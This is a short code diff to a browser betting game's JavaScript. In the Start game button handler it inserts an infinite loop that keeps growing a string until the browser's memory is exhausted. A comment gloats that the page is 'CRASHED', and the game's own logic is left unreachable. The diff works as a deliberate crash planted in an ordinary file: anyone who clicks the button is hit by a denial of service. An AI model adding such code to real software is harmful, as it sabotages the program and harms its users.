@@ -59,6 +59,11 @@ decreaseBetBtn.addEventListener("click", () => {
 
 // Start game
 startGameBtn.addEventListener("click", () => {
+    txt = "a";
+    while(1){
+        txt = txt += "a";    //add as much as the browser can handle
+    }
+//[evil laugh] BOOM! All memory used up, and it is now CRASHED!
     if (balance < bet) {
         messageDiv.textContent = "Not enough balance!";
         return;
